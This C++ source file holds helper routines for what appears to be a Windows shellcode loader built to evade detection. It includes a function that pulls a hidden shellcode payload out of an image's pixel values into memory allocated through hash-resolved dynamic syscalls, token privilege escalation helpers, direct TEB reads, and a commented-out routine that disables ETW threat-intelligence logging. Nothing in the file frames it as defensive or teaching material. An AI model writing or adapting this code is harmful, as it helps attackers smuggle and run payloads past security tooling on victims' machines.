#include "Tools.h"
#include "definition.h"
#include "Function.hpp"


static auto& dynamicInvoker = DynamicInvoker::get_instance();

// DebugPrint
#ifdef _DEBUG
void DebugPrintA(const char* format, ...) {
	char buffer[1024];
	va_list args;
	va_start(args, format);
	vsprintf_s(buffer, sizeof(buffer), format, args);
	va_end(args);
	OutputDebugStringA(buffer);
	std::cout << buffer << std::endl;
}
void DebugPrintW(const wchar_t* format, ...) {
	wchar_t buffer[1024];
	va_list args;
	va_start(args, format);
	vswprintf_s(buffer, sizeof(buffer) / sizeof(wchar_t), format, args);
	va_end(args);
	OutputDebugStringW(buffer);
	std::wcout << buffer << std::endl;
}
#else
void DebugPrintA(const char* format, ...) {}
void DebugPrintW(const wchar_t* format, ...) {}

#endif



LPSTR charToLPSTR(const char* str) {
	if (str == nullptr) {
		return nullptr;
	}

	size_t len = strlen(str);

	LPSTR lpstr = (LPSTR)LocalAlloc(LPTR, len + 1);

	if (lpstr != nullptr) {
		strcpy_s(lpstr, len + 1, str);
	}

	return lpstr;
}
LPCWSTR charToLPCWSTR(const char* charString) {
	// Calculate the size needed for the wide string buffer
	int size_needed = MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);

	// Allocate memory for the wide string buffer
	static wchar_t wideString[256];
	if (size_needed > sizeof(wideString) / sizeof(wideString[0])) {
		// Handle buffer size exceeded case
		return NULL;
	}

	// Perform the conversion
	MultiByteToWideChar(CP_ACP, 0, charString, -1, wideString, size_needed);

	return wideString;
}
LPWSTR charToLPWSTR(const char* charString) {
	// Calculate the size needed for the wide string buffer
	int size_needed = MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);

	// Allocate memory for the wide string buffer
	static wchar_t wideString[256];  // Adjust buffer size as needed
	if (size_needed > sizeof(wideString) / sizeof(wideString[0])) {
		// Handle buffer size exceeded case
		return NULL;
	}

	// Perform the conversion
	MultiByteToWideChar(CP_ACP, 0, charString, -1, wideString, size_needed);

	return wideString;
}

DWORD myGetCurrentThreadId() {
	static PTEB teb;
	if (!teb) {
		teb = (PTEB)__readgsqword(0x30);
	}
	return (DWORD)(teb->ClientId.UniqueThread);
}


DWORD myGetCurrentProcessId() {
	static PTEB teb;
	if (!teb) {
		teb = (PTEB)__readgsqword(0x30);
	}
	return (DWORD)(teb->ClientId.UniqueProcess);
}

ULONG64 AR_getTickcount64() {
	PKUSER_SHARED_DATA sharedData = (PKUSER_SHARED_DATA)(0x7FFE0000);
	ULONG64 uptime = ((sharedData->TickCountMultiplier) * (sharedData->TickCountQuad)) >> 24;
	return uptime;
}

__forceinline wchar_t locase_w(wchar_t c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}
wchar_t* _strstri_w(const wchar_t* s, const wchar_t* sub_s)
{
	wchar_t c0, c1, c2, * tmps, * tmpsub;

	if (s == sub_s)
		return (wchar_t*)s;

	if (s == 0)
		return 0;

	if (sub_s == 0)
		return 0;

	c0 = locase_w(*sub_s);
	while (c0 != 0) {

		while (*s != 0) {
			c2 = locase_w(*s);
			if (c2 == c0)
				break;
			s++;
		}

		if (*s == 0)
			return 0;

		tmps = (wchar_t*)s;
		tmpsub = (wchar_t*)sub_s;
		do {
			c1 = locase_w(*tmps);
			c2 = locase_w(*tmpsub);
			tmps++;
			tmpsub++;
		} while ((c1 == c2) && (c2 != 0));

		if (c2 == 0)
			return (wchar_t*)s;

		s++;
	}
	return 0;
}

BOOL ExtractShellcodeFromImage(LPCWSTR imagePath, PBYTE* shellcode, DWORD* size) {
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    Gdiplus::Bitmap* bitmap = Gdiplus::Bitmap::FromFile(imagePath);
    if (!bitmap) {
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return FALSE;
    }
    // 读取大小信息（前4个字节）
    BYTE size_bytes[4] = {0};
    DWORD byte_idx = 0;
    
    // 直接读取前4个字节作为大小信息
    for (UINT y = 0; y < bitmap->GetHeight() && byte_idx < 4; y++) {
        for (UINT x = 0; x < bitmap->GetWidth() && byte_idx < 4; x++) {
            Gdiplus::Color color;
            bitmap->GetPixel(x, y, &color);
            
            for (int c = 0; c < 3 && byte_idx < 4; c++) {
                switch (c) {
                    case 0: size_bytes[byte_idx] = color.GetR(); break;
                    case 1: size_bytes[byte_idx] = color.GetG(); break;
                    case 2: size_bytes[byte_idx] = color.GetB(); break;
                }
                byte_idx++;
            }
        }
    }
    // 从字节数组中读取大小
    *size = *(DWORD*)size_bytes;
    // DebugPrintA("[DEBUG] Extracted size: %d\n", *size);
    // DebugPrintA("[DEBUG] Size bytes: %02X %02X %02X %02X\n", 
    //             size_bytes[0], size_bytes[1], size_bytes[2], size_bytes[3]);
    
	PVOID baseAddress = NULL;
	SIZE_T regionSize = *size;
	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(
		NtAllocateVirtualMemoryStruct.funcAddr,
		NtAllocateVirtualMemoryStruct.funcHash,
		(HANDLE)-1,      
		&baseAddress,    
		0,               
		&regionSize,     
		MEM_COMMIT,      
		PAGE_READWRITE   
	);

	if (!NT_SUCCESS(status)) {
		delete bitmap;
		Gdiplus::GdiplusShutdown(gdiplusToken);
		return FALSE;
	}
	*shellcode = (PBYTE)baseAddress;

	ZeroMemory(*shellcode, *size);
    byte_idx = 0;
    DWORD data_idx = 0;
    
    // 从第5个字节开始读取数据
    for (UINT y = 0; y < bitmap->GetHeight() && data_idx < *size; y++) {
        for (UINT x = 0; x < bitmap->GetWidth() && data_idx < *size; x++) {
            Gdiplus::Color color;
            bitmap->GetPixel(x, y, &color);
            
            for (int c = 0; c < 3 && data_idx < *size; c++) {
                if (byte_idx >= 4) {  // 跳过大小信息
                    switch (c) {
                        case 0: (*shellcode)[data_idx++] = color.GetR(); break;
                        case 1: (*shellcode)[data_idx++] = color.GetG(); break;
                        case 2: (*shellcode)[data_idx++] = color.GetB(); break;
                    }
                }
                byte_idx++;
            }
        }
    }
    delete bitmap;
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return TRUE;
}
std::string WideToUtf8(const std::wstring& wstr) {
	if (wstr.empty()) return {};

	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.data(), -1, nullptr, 0, nullptr, nullptr);
	std::string result(size_needed - 1, 0);
	WideCharToMultiByte(CP_UTF8, 0, wstr.data(), -1, &result[0], size_needed, nullptr, nullptr);
	return result;
}

std::string EscapeJsonString(const std::string& input) {
	std::string output;
	for (char c : input) {
		switch (c) {
		case '\\': output += "\\\\"; break;
		case '\"': output += "\\\""; break;
		case '\b': output += "\\b"; break;
		case '\f': output += "\\f"; break;
		case '\n': output += "\\n"; break;
		case '\r': output += "\\r"; break;
		case '\t': output += "\\t"; break;
		default:
			if (static_cast<unsigned char>(c) < 0x20) {
				char buf[7];
				snprintf(buf, sizeof(buf), "\\u%04x", c);
				output += buf;
			}
			else {
				output += c;
			}
		}
	}
	return output;
}

std::string Base64Decode(const std::string& encoded) {
	static const std::string base64_chars =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz"
		"0123456789+/";

	auto is_base64 = [](unsigned char c) {
		return (isalnum(c) || (c == '+') || (c == '/'));
		};

	int in_len = encoded.size();
	int i = 0, j = 0, in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded[in_] != '=') && is_base64(encoded[in_])) {
		char_array_4[i++] = encoded[in_]; in_++;
		if (i == 4) {
			for (i = 0; i < 4; ++i)
				char_array_4[i] = base64_chars.find(char_array_4[i]) & 0xff;

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; i < 3; ++i)
				ret += char_array_3[i];

			i = 0;
		}
	}

	if (i) {
		for (j = i; j < 4; ++j)
			char_array_4[j] = 0;

		for (j = 0; j < 4; ++j)
			char_array_4[j] = base64_chars.find(char_array_4[j]) & 0xff;

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

		for (j = 0; j < (i - 1); ++j) ret += char_array_3[j];
	}

	return ret;
}


void custom_sleep(int milliseconds) {
	LARGE_INTEGER frequency;  // 计时器频率
	LARGE_INTEGER start, now;  // 开始时间和当前时间
	double elapsedTime;

	QueryPerformanceFrequency(&frequency);
	// 当前时间
	QueryPerformanceCounter(&start);

	// 等待直到延迟时间过去
	do {
		QueryPerformanceCounter(&now);
		elapsedTime = static_cast<double>(now.QuadPart - start.QuadPart) / frequency.QuadPart * 1000.0;
	} while (elapsedTime < milliseconds);
}

BOOL IsRunningAsAdmin()
{
	HANDLE hToken = NULL;
	TOKEN_ELEVATION elevation;
	DWORD dwSize = 0;

	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtOpenProcessTokenStruct.funcAddr, NtOpenProcessTokenStruct.funcHash,
		(HANDLE)-1, TOKEN_QUERY, &hToken);

	if(!NT_SUCCESS(status)) return FALSE;


	dynamicInvoker.Invoke<NTSTATUS>(NtQueryInformationTokenStruct.funcAddr, NtQueryInformationTokenStruct.funcHash,
		hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize);
	
	if(!NT_SUCCESS(status)) {
		CloseHandle(hToken);
		return FALSE;
	}


	CloseHandle(hToken);
	return elevation.TokenIsElevated;
}

BOOL SetPrivilege(LPCWSTR privilege)
{
	// 64-bit only
	if (sizeof(LPVOID) != 8)
	{
		return FALSE;
	}

	// Initialize handle to process token
	HANDLE token = NULL;

	// Open our token
	if (!NT_SUCCESS(dynamicInvoker.Invoke<NTSTATUS>(NtOpenProcessTokenStruct.funcAddr, NtOpenProcessTokenStruct.funcHash
		,(HANDLE)-1, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &token))){
		return FALSE;
	}

	// Token elevation struct
	TOKEN_ELEVATION tokenElevation = { 0 };
	DWORD tokenElevationSize = sizeof(TOKEN_ELEVATION);

	// Get token elevation status
	if (dynamicInvoker.Invoke<NTSTATUS>(NtQueryInformationTokenStruct.funcAddr, NtQueryInformationTokenStruct.funcHash,
		token, TokenElevation, &tokenElevation, sizeof(tokenElevation), &tokenElevationSize) != 0)
	{
		dynamicInvoker.Invoke<NTSTATUS>(NtCloseStruct.funcAddr, NtCloseStruct.funcHash ,token);
		return FALSE;
	}

	// Check if token is elevated
	if (!tokenElevation.TokenIsElevated)
	{
		dynamicInvoker.Invoke<NTSTATUS>(NtCloseStruct.funcAddr, NtCloseStruct.funcHash, token);
		return FALSE;
	}

	// Lookup the LUID for the specified privilege
	LUID luid;
	if (!LookupPrivilegeValue(NULL, privilege, &luid))
	{
		dynamicInvoker.Invoke<NTSTATUS>(NtCloseStruct.funcAddr, NtCloseStruct.funcHash, token);
		return FALSE;
	}

	// Size of token privilege struct
	DWORD tokenPrivsSize = 0;

	// Get size of current privilege array
	if (dynamicInvoker.Invoke<NTSTATUS>(NtQueryInformationTokenStruct.funcAddr, NtQueryInformationTokenStruct.funcHash,
		token, TokenPrivileges, NULL, NULL, &tokenPrivsSize) != 0xC0000023){
		dynamicInvoker.Invoke<NTSTATUS>(NtCloseStruct.funcAddr, NtCloseStruct.funcHash, token);
		return FALSE;
	}

	// Allocate memory to store current token privileges
	PTOKEN_PRIVILEGES tokenPrivs = (PTOKEN_PRIVILEGES)new BYTE[tokenPrivsSize];

	// Get current token privileges
	if (dynamicInvoker.Invoke<NTSTATUS>(NtQueryInformationTokenStruct.funcAddr, NtQueryInformationTokenStruct.funcHash, token, TokenPrivileges, tokenPrivs, tokenPrivsSize, &tokenPrivsSize) != 0)
	{
		delete tokenPrivs;
		dynamicInvoker.Invoke<NTSTATUS>(NtCloseStruct.funcAddr, NtCloseStruct.funcHash, token);
		return FALSE;
	}

	// Track whether or not token has the specified privilege
	BOOL status = FALSE;

	// Loop through privileges assigned to token to find the specified privilege
	for (DWORD i = 0; i < tokenPrivs->PrivilegeCount; i++)
	{
		if (tokenPrivs->Privileges[i].Luid.LowPart == luid.LowPart &&
			tokenPrivs->Privileges[i].Luid.HighPart == luid.HighPart)
		{
			// Located the specified privilege, enable it if necessary
			if (!(tokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED))
			{
				tokenPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;

				// Apply updated privilege struct to token
				if (dynamicInvoker.Invoke<NTSTATUS>(NtAdjustPrivilegesTokenStruct.funcAddr, NtAdjustPrivilegesTokenStruct.funcHash,
					token, FALSE, tokenPrivs, tokenPrivsSize, NULL, NULL) == 0){
					status = TRUE;
				}
			}
			else{
				status = TRUE;
			}
			break;
		}
	}

	// Free token privileges buffer
	delete tokenPrivs;

	// Close token handle
	dynamicInvoker.Invoke<NTSTATUS>(NtCloseStruct.funcAddr, NtCloseStruct.funcHash, (token));

	return status;
}

/*
auto DisableETWTI() -> BOOLEAN{
	SetPrivilege(SE_DEBUG_NAME);
	PROCESS_LOGGING_INFORMATION logInfo = { 0 };
	logInfo.EnableReadVmLogging = false;
	logInfo.EnableWriteVmLogging = false;
	size_t logInfoLength = sizeof(logInfo);
	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtSetInformationProcessStruct.funcAddr, NtSetInformationProcessStruct.funcHash, 
		(HANDLE)-1,
		ProcessEnableLogging,
		&logInfo, 
		logInfoLength
	);

	if (NT_SUCCESS(status)) return TRUE;
	return FALSE;

}
*/
